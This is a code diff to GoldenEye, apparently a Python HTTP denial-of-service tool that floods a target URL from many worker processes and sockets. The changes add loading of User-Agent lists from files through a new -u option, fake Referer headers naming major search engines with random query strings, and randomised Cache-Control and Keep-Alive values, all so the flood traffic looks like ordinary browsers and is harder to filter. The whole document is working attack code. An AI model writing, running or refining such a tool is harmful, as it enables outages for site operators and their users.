@@ -42,7 +42,7 @@ BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 
 from multiprocessing import Process, Manager
 import urlparse, ssl
-import sys, getopt, random, time
+import sys, getopt, random, time, os
 
 # Python version-specific 
 if  sys.version_info < (3,0):
@@ -84,6 +84,7 @@ class GoldenEye(object):
     # Containers
     workersQueue = []
     manager = None
+    useragents = []
 
     # Properties
     url = None
@@ -131,6 +132,7 @@ class GoldenEye(object):
             try:
 
                 worker = Laser(self.url, self.nr_sockets, self.counter)
+                worker.useragents = self.useragents
                 worker.method = self.method
 
                 self.workersQueue.append(worker)
@@ -139,6 +141,7 @@ class GoldenEye(object):
                 error("Failed to start worker {0}".format(i))
                 pass 
 
+        print "%d User-Agent Strings loaded" % len(self.useragents)
         print "Initiating monitor"
         self.monitor()
 
@@ -233,27 +236,13 @@ class Laser(Process):
 
 
         self.referers = [ 
-            'http://www.google.com/?q=',
-            'http://www.usatoday.com/search/results?q=',
-            'http://engadget.search.aol.com/search?q=',
+            'http://www.google.com/',
+            'http://www.bing.com/',
+            'http://www.baidu.com/',
+            'http://www.yandex.com/',
             'http://' + self.host + '/'
             ]
 
-
-        self.useragents = [
-            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
-            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
-            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
-            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
-            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
-            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
-            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
-            ]
 
     def __del__(self):
         self.stop()
@@ -379,9 +368,10 @@ class Laser(Process):
     def generateRandomHeaders(self):
 
         # Random no-cache entries
-        noCacheDirectives = ['no-cache', 'must-revalidate']
+        noCacheDirectives = ['no-cache', 'max-age=0']
         random.shuffle(noCacheDirectives)
-        noCache = ', '.join(noCacheDirectives)
+        nrNoCache = random.randint(0, (len(noCacheDirectives)-1))
+        noCache = ', '.join(noCacheDirectives[:nrNoCache])
 
         # Random accept encoding
         acceptEncoding = ['\'\'','*','identity','gzip','deflate']
@@ -394,7 +384,7 @@ class Laser(Process):
             'Cache-Control': noCache,
             'Accept-Encoding': ', '.join(roundEncodings),
             'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(110,120),
+            'Keep-Alive': random.randint(1,1000),
             'Host': self.host,
         }
     
@@ -410,7 +400,14 @@ class Laser(Process):
 
         if random.randrange(2) == 0:
             # Random Referer
-            http_headers['Referer'] = random.choice(self.referers) + self.buildblock(random.randint(5,10))
+            url_part = self.buildblock(random.randint(5,10))
+
+            random_referer = random.choice(self.referers) + url_part
+            
+            if random.randrange(2) == 0:
+                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+
+            http_headers['Referer'] = random_referer
 
         if random.randrange(2) == 0:
             # Random Content-Trype
@@ -456,6 +453,7 @@ def usage():
     print
     print ' OPTIONS:'
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
+    print '\t -u, --useragents\t\tFile with user-agents to use\t\t\t\t(default: random from res/lists/useragents)'
     print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
     print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
     print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
@@ -493,16 +491,21 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:", ["debug", "help", "workers", "sockets", "method" ])
+        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
         method = METHOD_GET
 
+        uas_file = None
+        useragents = []
+
         for o, a in opts:
             if o in ("-h", "--help"):
                 usage()
                 sys.exit()
+            elif o in ("-u", "--useragents"):
+                uas_file = a
             elif o in ("-s", "--sockets"):
                 socks = int(a)
             elif o in ("-w", "--workers"):
@@ -518,7 +521,19 @@ def main():
             else:
                 error("option '"+o+"' doesn't exists")
 
+
+        if uas_file is None:
+            uas_file = random.choice(os.listdir('res/lists/useragents'))
+            uas_file = 'res/lists/useragents/'+uas_file
+
+        try:
+            with open(uas_file) as f:
+                useragents = f.readlines()
+        except EnvironmentError:
+                error("cannot read file {0}".format(uas_file))
+
         goldeneye = GoldenEye(url)
+        goldeneye.useragents = useragents
         goldeneye.nr_workers = workers
         goldeneye.method = method
         goldeneye.nr_sockets = socks
